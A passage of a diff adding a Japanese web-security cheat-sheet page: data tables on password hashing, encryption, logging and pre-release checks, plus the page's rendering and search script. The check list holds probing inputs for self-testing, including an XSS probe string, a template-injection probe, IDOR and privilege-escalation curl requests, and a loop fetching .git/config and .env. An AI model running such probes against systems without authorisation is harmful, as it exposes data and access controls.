ハッシュ（bcrypt/Argon2id）\n// カード番号 → 暗号化（AES-GCM）または保持しない","u":3}],["用途に合ったハッシュ","速いハッシュは危険","**パスワードには「わざと遅い」ハッシュ**を使う。SHA-256 は高速なので、総当たりが現実的になる。","対策",{"ex":"// パスワード: Argon2id / bcrypt / scrypt\n// 完全性の検証: SHA-256（速くてよい）","u":3}],["認証付き暗号","改ざんを検知する","**AES-GCM のように暗号化と改ざん検知が一体の方式**を使う。ECB モードは同じ平文が同じ暗号文になり、模様が見えるほど弱い。","対策",{"ex":"// OK: AES-256-GCM\n// NG: AES-ECB","u":3}],["乱数の質","推測できてはいけない","**`Math.random()` や `java.util.Random` は暗号用途に使えない**。トークンや鍵には専用の生成器を使う。","対策",{"ex":"// Node\ncrypto.randomBytes(32)\n// Java\nnew SecureRandom()\n// Python\nsecrets.token_urlsafe(32)","u":3}],["IV / nonce の再利用","同じ値を2度使わない","**GCM で nonce を再利用すると、鍵そのものが危うくなる**。毎回新しく生成し、暗号文と一緒に保存する（秘密ではない）。","対策",{"ex":"const iv = crypto.randomBytes(12);   // 毎回生成\n// 保存: iv + 暗号文 + 認証タグ","u":3}],["鍵の保管と回転","入れ替えられる構造にする","**コードや設定ファイルに直接書かない**。秘密管理サービスに置き、**鍵 ID を暗号文に添えて**おくと、後から入れ替えられる。","対策",{"ex":"// 保存形式: {keyId, iv, ciphertext, tag}\n// 復号時に keyId で鍵を選ぶ → 段階的な入れ替えが可能","u":3}],["保存する情報を減らす","持たなければ漏れない","**最も確実な対策は「持たない」**。カード番号は決済代行に預け、不要な個人情報は保持期限を決めて消す。","原則",{"ex":"// 漏れて困るものは、そもそも保存しない設計にできないか","u":3}],["通信は必ず TLS","平文を流さない","**内部ネットワークでも暗号化する**。境界の内側は安全という前提は、侵入された時点で崩れる。","対策",{"ex":"// HSTS で HTTP へのフォールバックも塞ぐ\nStrict-Transport-Security: max-age=31536000; includeSubDomains","u":3}]]},{"g":"ops","id":"log","t":"ログと監視","note":"**攻撃を完全には防げない。気づけるかどうかで被害が変わる。**","cols":["項目","何が起きるか","仕組みと対策","分類"],"rows":[["記録すべきこと","追跡できる最低限","**認証の成否、権限変更、重要データの参照と更新、管理操作**。いつ・誰が・どこから・何をしたかが揃っていること。","対策",{"ex":"// timestamp / actor / source ip / action / target / result","u":3}],["記録してはいけないこと","ログが漏洩源になる","**パスワード、トークン、Cookie、カード番号、個人情報**。ログは複製され、権限の緩い場所に流れやすい。","対策",{"ex":"// マスクしてから出す\nlog.info(\"login user={} token={}\", user, mask(token));","u":3}],["改ざんされない置き場","消される前提で考える","**侵入者は真っ先にログを消す**。別のアカウント・別のアカウント境界へ転送し、追記のみにする。","対策",{"ex":"// 転送先は書き込み専用の権限にする","u":2}],["検知したい兆候","何を見るか","**認証失敗の急増、深夜の管理操作、普段と違う地域からの成功、大量のダウンロード、5xx の急増**。","運用",{"ex":"// 「失敗の増加」より「失敗のあとの成功」のほうが重要な兆候","u":3}],["相関 ID","横断して追う","**リクエストごとの ID を全ログに含める**と、複数サービスにまたがる経路を1本で追える。利用者への応答にも返すと問い合わせ対応が速い。","対策",{"ex":"X-Request-Id: 7f3c1ab9-...","u":3}]]},{"g":"ops","id":"check","t":"リリース前チェック","note":"**手を動かして確認する項目**。設計レビューでは見つからないものを拾う。","cols":["項目","何が起きるか","仕組みと対策","分類"],"rows":[["他人の ID で叩く","認可の確認","**自分のトークンで、他人の資源の ID を指定して全 API を叩く**。IDOR は最も多く、この方法で確実に見つかる。","手順",{"ex":"curl -H \"Cookie: session=<自分>\" https://example.com/api/orders/<他人のID>","u":3}],["権限の低い利用者で管理 API を叩く","垂直権限昇格の確認","**画面に出ないだけの API が無いか**。管理系の全エンドポイントを一般ユーザーのトークンで試す。","手順",{"ex":"curl -X DELETE -H \"Cookie: session=<一般>\" https://example.com/api/users/1","u":3}],["入力欄に記号を入れる","注入の確認","**`'` `\"` `<` `>` `;` `{{7*7}}` を全項目に入れて、壊れ方を見る**。エラーの出方で内部が推測できないかも同時に確認する。","手順",{"ex":"'\"><img src=x onerror=console.log(1)>\n{{7*7}}","u":3}],["セッションの挙動","ログイン前後と失効","**ログイン前後で ID が変わるか、ログアウト後に古い ID が通らないか**を実際に試す。","手順",{"ex":"// ログイン前の Cookie を控え、ログイン後に使えないことを確認","u":3}],["Cookie 属性の確認","3点セットが付いているか","**Secure / HttpOnly / SameSite** を実際の応答で見る。設定したつもりで付いていないことがある。","手順",{"ex":"curl -I https://example.com/login | grep -i set-cookie","u":3}],["セキュリティヘッダの確認","付いているか","**HSTS / CSP / nosniff / frame-ancestors**。外部の診断サイトでも一括で確認できる。","手順",{"ex":"curl -sI https://example.com | grep -iE \"strict-transport|content-security|x-content-type|x-frame\"","u":3}],["公開してはいけないパス","定番の確認","**`.git` `.env` `/actuator` `/swagger` `backup`**。1コマンドで確認できる。","手順",{"ex":"for p in .git/config .env actuator/env swagger-ui.html; do curl -o /dev/null -s -w \"%{http_code} $p\\n\" https://example.com/$p; done","u":3}],["依存の脆弱性","既知の穴が残っていないか","**リリースのたびに実行する**。CI に組み込んで、新規の重大な脆弱性でビルドを止める。","手順",{"ex":"npm audit --production\nmvn org.owasp:dependency-check-maven:check","u":3}],["本番と検証の差","設定の食い違い","**検証で通っても本番で穴が開く**のは設定差が原因。デバッグ機能、エラー表示、CORS、ログレベルを環境ごとに突き合わせる。","手順",{"ex":"// 環境ごとの設定を diff で比較する","u":3}]]}];
+const NAV_GROUPS = [{"g":"basic","label":"考え方"},{"g":"inject","label":"注入（XSS・SQLi など）"},{"g":"session","label":"セッション・認証・認可"},{"g":"client","label":"ブラウザ側（CSRF など）"},{"g":"server","label":"サーバー側"},{"g":"crypto","label":"暗号・秘密情報"},{"g":"ops","label":"運用・確認"}];
+const PRIORITY = {"t":"最初に覚える10個","label":"項目","group":"basic","note":"**この10個を押さえるだけで、実際に起きる事故の大半は避けられる。**","rows":[["★★★","データと命令を混ぜない","注入系はすべてこれ。連結をやめて値として渡す"],["★★★","ブラウザから来るものは全部疑う","隠しフィールドも JS の検証結果も改ざんできる"],["★★★","出力する場所に合わせて無害化する","入力時に一律処理すると壊れる"],["★★★","Secure / HttpOnly / SameSite","Cookie の3点セット。付けるだけで効く"],["★★★","ログイン時にセッション ID を作り直す","セッション固定化はこれで消える"],["★★★","所有者を条件に入れて取得する","IDOR は最も多い欠陥。確認忘れを構造で防ぐ"],["★★★","認可の既定を拒否にする","書き忘れが穴にならない構えを作る"],["★★★","パスワードは遅いハッシュで保存する","bcrypt / Argon2id。SHA-256 は速すぎる"],["★★★","エラーの詳細を外に出さない","内部構造は攻撃の地図になる"],["★★★","他人の ID で自分の API を叩いてみる","リリース前に1度やるだけで見つかる"]]};
+
+const esc = s => String(s).replace(/[&<>"]/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c]));
+const fmt = s => esc(s)
+  .replace(/\*\*([^*]+)\*\*/g, '<strong>$1</strong>')
+  .replace(/`([^`]+)`/g, '<code>$1</code>');
+
+function keysHtml(raw){
+  if (!raw || raw === '—') return '<span class="knone">—</span>';
+  const chords = String(raw).split(' ').filter(Boolean);
+  const parts = [];
+  chords.forEach((chord, ci) => {
+    if (ci) parts.push('<span class="ksep">›</span>');
+    chord.split('+').forEach((k, i) => {
+      if (i) parts.push('<span class="ksep">+</span>');
+      parts.push('<kbd>' + esc(k) + '</kbd>');
+    });
+  });
+  return parts.join('');
+}
+
+const main = document.getElementById('main');
+const rail = document.getElementById('rail');
+const frag = document.createDocumentFragment();
+let totalRows = 0;
+
+for (const sec of DATA){
+  const el = document.createElement('section');
+  el.className = 'sec';
+  el.id = sec.id;
+  el.dataset.group = sec.g;
+
+  const nCols = sec.cols.length;
+  const isKeys = sec.kind === 'keys';
+  const cls = nCols === 4 ? ['c-cmd','c-sum','c-det','c-par'] : ['c-cmd','c-sum','c-par'];
+  const sigil = sec.sig || SIGIL;
+
+  const head = '<div class="sec-head"><h3>' + esc(sec.t) + '</h3><span class="n">' + sec.rows.length + ' 項目</span></div>'
+    + (sec.note ? '<p class="sec-note">' + fmt(sec.note) + '</p>' : '');
+  const ths = sec.cols.map((c,i) => '<th class="' + cls[i] + '" scope="col">' + esc(c) + '</th>').join('');
+
+  const trs = sec.rows.map(r => {
+    const meta = (typeof r[r.length-1] === 'object') ? r[r.length-1] : null;
+    const vals = meta ? r.slice(0,-1) : r;
+    totalRows++;
+    const cells = [];
+
+    if (isKeys){
+      let c0 = '<span class="act">' + fmt(vals[0]) + '</span>';
+      if (meta && meta.tag) c0 += '<span class="tag">' + esc(meta.tag) + '</span>';
+      cells.push('<td data-label="' + esc(sec.cols[0]) + '">' + c0 + '</td>');
+      for (let i = 1; i < nCols; i++){
+        const v = vals[i] == null ? '—' : vals[i];
+        if (i <= 2){
+          const btn = (v && v !== '—')
+            ? '<button class="keycell" type="button" title="クリックでコピー" data-copy="' + esc(v) + '">' + keysHtml(v) + '</button>'
+            : '<span class="knone">—</span>';
+          cells.push('<td data-label="' + esc(sec.cols[i]) + '">' + btn + '</td>');
+        } else {
+          cells.push('<td data-label="' + esc(sec.cols[i]) + '"><span class="det' + (v === '—' ? ' none' : '') + '">' + fmt(v) + '</span></td>');
+        }
+      }
+    } else {
+      const name = vals[0];
+      const u = (meta && meta.u) || 1;
+      let first = (u > 1 ? '<span class="rank">' + '★'.repeat(u) + '</span>' : '')
+        + '<button class="cmd" type="button" data-copy="' + esc(name) + '" title="クリックでコピー">'
+        + (name.startsWith('/') ? '<i>/</i>' + esc(name.slice(1)) : esc(name)) + '</button>';
+      if (meta && meta.alias) first += '<div class="aliases">' + meta.alias.map(a => '<span class="alias">' + esc(a) + '</span>').join('') + '</div>';
+      if (meta && meta.tag) first += '<span class="tag">' + esc(meta.tag) + '</span>';
+      if (meta && meta.kind) first += '<span class="kindchip k-' + meta.kind.k + '">' + esc(meta.kind.l) + '</span>';
+      cells.push('<td class="' + cls[0] + '" data-label="' + esc(sec.cols[0]) + '">' + first + '</td>');
+      for (let i = 1; i < nCols; i++){
+        const isLast = (i === nCols - 1);
+        let v = vals[i];
+        if (v == null || v === '') v = isLast ? '' : '—';
+        let inner;
+        if (isLast){
+          const p = (v && v !== '—') ? '<span class="par">' + fmt(v) + '</span>'
+            : (v === '—' ? '<span class="par none">—</span>' : '');
+          const ex = meta && meta.ex
+            ? '<button class="ex" type="button" title="クリックでコピー" data-copy="' + esc(meta.ex) + '"><b>' + sigil + '</b>' + esc(meta.ex) + '</button>'
+            : '';
+          inner = '<div class="pcell">' + p + ex + '</div>';
+        } else {
+          inner = '<span class="' + (i === 1 ? 'sum' : 'det') + (v === '—' ? ' none' : '') + '">' + fmt(v) + '</span>';
+        }
+        cells.push('<td class="' + cls[i] + '" data-label="' + esc(sec.cols[i]) + '">' + inner + '</td>');
+      }
+    }
+
+    const search = (vals.join(' ') + ' '
+      + (meta && meta.alias ? meta.alias.join(' ') : '') + ' '
+      + (meta && meta.tag ? meta.tag : '') + ' '
+      + (meta && meta.ex ? meta.ex : '') + ' '
+      + (meta && meta.s ? meta.s : '') + ' '
+      + (meta && meta.kind ? meta.kind.l : '')).toLowerCase();
+    return '<tr class="row' + (meta && meta.tag ? ' flagged' : '') + '"'
+      + ' data-u="' + ((meta && meta.u) || 1) + '" data-s="' + esc(search) + '">' + cells.join('') + '</tr>';
+  }).join('');
+
+  el.innerHTML = head + '<div class="tablewrap"><table class="cols-' + nCols + (isKeys ? ' tkeys' : '') + '">'
+    + '<thead><tr>' + ths + '</tr></thead><tbody>' + trs + '</tbody></table></div>';
+  frag.appendChild(el);
+}
+main.insertBefore(frag, document.getElementById('empty'));
+
+if (PRIORITY && PRIORITY.rows.length){
+  const last = document.createElement('section');
+  last.className = 'sec';
+  last.id = 'priority';
+  last.dataset.group = PRIORITY.group;
+  last.innerHTML = '<div class="sec-head"><h3>' + esc(PRIORITY.t) + '</h3><span class="n">優先度順</span></div>'
+    + (PRIORITY.note ? '<p class="sec-note">' + fmt(PRIORITY.note) + '</p>' : '')
+    + '<div class="tablewrap"><table class="cols-3 priority"><thead><tr>'
+    + '<th class="c-cmd" scope="col">優先度</th><th class="c-sum" scope="col">' + esc(PRIORITY.label) + '</th>'
+    + '<th class="c-par" scope="col">理由</th></tr></thead><tbody>'
+    + PRIORITY.rows.map(([s,c,w]) =>
+        '<tr class="row" data-s="' + esc((c + ' ' + w).toLowerCase()) + '">'
+        + '<td data-label="優先度">' + s + '</td>'
+        + '<td data-label="' + esc(PRIORITY.label) + '"><span class="sum">'
+        + c.split(' / ').map(x => '<code>' + esc(x) + '</code>').join(' ') + '</span></td>'
+        + '<td data-label="理由"><span class="det">' + esc(w) + '</span></td></tr>').join('')
+    + '</tbody></table></div>';
+  main.insertBefore(last, document.getElementById('empty'));
+}
+
+let navHtml = '';
+for (const grp of NAV_GROUPS){
+  const secs = DATA.filter(s => s.g === grp.g);
+  if (!secs.length) continue;
+  navHtml += '<h2>' + esc(grp.label) + '</h2><div class="navlist">';
+  for (const s of secs){
+    navHtml += '<a href="#' + s.id + '" data-target="' + s.id + '">' + esc(s.t) + '<span>' + s.rows.length + '</span></a>';
+  }
+  navHtml += '</div>';
+}
+rail.innerHTML = navHtml;
+
+const q = document.getElementById('q');
+const hits = document.getElementById('hits');
+const emptyEl = document.getElementById('empty');
+function apply(){
+  const term = q.value.trim().toLowerCase();
+  let shown = 0;
+  for (const sec of document.querySelectorAll('.sec')){
+    let n = 0;
+    for (const row of sec.querySelectorAll('tr.row')){
+      const ok = !term || row.dataset.s.includes(term);
+      row.hidden = !ok;
+      if (ok) n++;
+    }
+    sec.hidden = n === 0;
+    if (sec.id !== 'priority') shown += n;
+  }
+  hits.textContent = term ? shown + ' / ' + totalRows + ' 件' : totalRows + ' 件';
+  emptyEl.classList.toggle('on', shown === 0);
+}
+q.addEventListener('input', apply);
+apply();
+
+document.addEventListener('click', e => {
+  const b = e.target.closest('.cmd, .ex, .keycell');
+  if (!b) return;
+  loadIntoEditor(b.dataset.copy);
+  if (!navigator.clipboard || !navigator.clipboard.writeText) return;
+  navigator.clipboard.writeText(b.dataset.copy).then(() => {
+    b.classList.add('copied');
+    const sig = b.querySelector('b');
+    if (sig && !sig.dataset.orig){ sig.dataset.orig = sig.textContent; sig.textContent = '✓'; }
+    setTimeout(() => {
+      b.classList.remove('copied');
+      if (sig && sig.dataset.orig){ sig.textContent = sig.dataset.orig; delete sig.dataset.orig; }
+    }, 1000);
+  }, () => {});
+});
+
+const bar = document.getElementById('bar');
+const setBar = () => document.documentElement.style.setProperty('--bar', bar.offsetHeight + 'px');
+setBar();
+if (window.ResizeObserver) new ResizeObserver(setBar).observe(bar); else window.addEventListener('resize', setBar);
+
+// ヘッダーの最小化: 一定量スクロールしたら自動で縮め、ボタンを押した後は手動優先に切り替える
+const barmin = document.getElementById('barmin');
+let barManual = false;
+function setMin(on){
+  if (bar.classList.contains('min') === on) return;
+  bar.classList.toggle('min', on);
+  barmin.setAttribute('aria-expanded', String(!on));
+  const label = on ? 'ヘッダーを元に戻す' : 'ヘッダーを最小化';
+  barmin.setAttribute('aria-label', label);
+  barmin.title = label;
+  setBar();
+}
+barmin.addEventListener('click', () => {
+  barManual = true;
+  setMin(!bar.classList.contains('min'));
+});
+window.addEventListener('scroll', () => {
+  if (barManual) return;
+  setMin(window.scrollY > 140);
+}, {passive:true});
+
+const links = [...rail.querySelectorAll('a')];
+const byId = new Map(links.map(a => [a.dataset.target, a]));
+const io = new IntersectionObserver(entries => {
+  for (const en of entries){
+    if (en.isIntersecting){
+      links.forEach(a => a.removeAttribute('aria-current'));
+      const a = byId.get(en.target.id);
+      if (a){
+        a.setAttribute('aria-current','true');
+        const r = a.getBoundingClientRect(), rr = rail.getBoundingClientRect();
+        if (rail.scrollHeight > rail.clientHeight && (r.top < rr.top || r.bottom > rr.bottom)){
+          rail.scrollTop += (r.top - rr.top) - rail.clientHeight / 3;
+        }
+      }
+      break;
+    }
+  }
+}, {rootMargin:'-80px 0px -70% 0px', threshold:0});
+document.querySelectorAll('.sec').forEach(s => io.observe(s));
+
+// 掲載順 ⇄ 便利順。元の並びは最初に控えておき、戻すときはそれを流し込む
+const sortsel = document.getElementById('sortsel');
+const original = new Map();
+
+function setSort(mode){
+  for (const tb of document.querySelectorAll('.sec:not(#priority) tbody')){
+    if (!original.has(tb)) original.set(tb, [...tb.rows]);
+    const rows = original.get(tb);
+    const list = mode === 'use'
+      ? rows.map((r, i) => [r, i])
+            .sort((a, b) => (+b[0].dataset.u) - (+a[0].dataset.u) || a[1] - b[1])
+            .map(x => x[0])
+      : rows;
+    const frag = document.createDocumentFragment();
+    for (const r of list) frag.appendChild(r);
+    tb.appendChild(frag);
+  }
+  document.body.classList.toggle('byuse', mode === 'use');
+  for (const b of sortsel.querySelectorAll('button')) b.setAttribute('aria-checked', String(b.dataset.v === mode));
+}
+
+sortsel.addEventListener('click', e => {
+  const b = e.target.closest('button');
+  if (b) setSort(b.dataset.v);
+});
+
+document.addEventListener('keydown', e => {
+  if (e.key === '/' && !/^(INPUT|TEXTAREA)$/.test(document.activeElement.tagName)){
+    e.preventDefault();
+    q.focus();
+  }
+});
+
+// ヘッダのコマンド編集欄: 表の項目をクリックすると流し込まれ、書き換えてからコピーできる
+const edit = document.getElementById('edit');
+const editCopy = document.getElementById('editcopy');
+const editClear = document.getElementById('editclear');
+
+function loadIntoEditor(text){
+  edit.value = text;
+  if (matchMedia('(pointer:fine)').matches){
+    edit.focus();
+    edit.setSelectionRange(text.length, text.length);
+  }
+}
+function flash(btn, label){
+  if (btn.dataset.orig) return;
+  btn.dataset.orig = btn.textContent;
+  btn.textContent = label;
+  setTimeout(() => { btn.textContent = btn.dataset.orig; delete btn.dataset.orig; }, 1000);
+}
+editCopy.addEventListener('click', () => {
+  if (!edit.value || !navigator.clipboard || !navigator.clipboard.writeText) return;
+  navigator.clipboard.writeText(edit.value).then(() => flash(editCopy, '✓ コピー'), () => {});
+});
+editClear.addEventListener('click', () => { edit.value = ''; edit.focus(); });
+edit.addEventListener('keydown', e => {
+  if (e.key === 'Enter'){ e.preventDefault(); editCopy.click(); }
+});
+
+// 表の組み立てが終わったので覆いを外す
+const veil = document.getElementById('veil');
+if (veil){ veil.classList.add('off'); setTimeout(() => veil.remove(), 240); }
+
+</script>
+</body>
+</html>
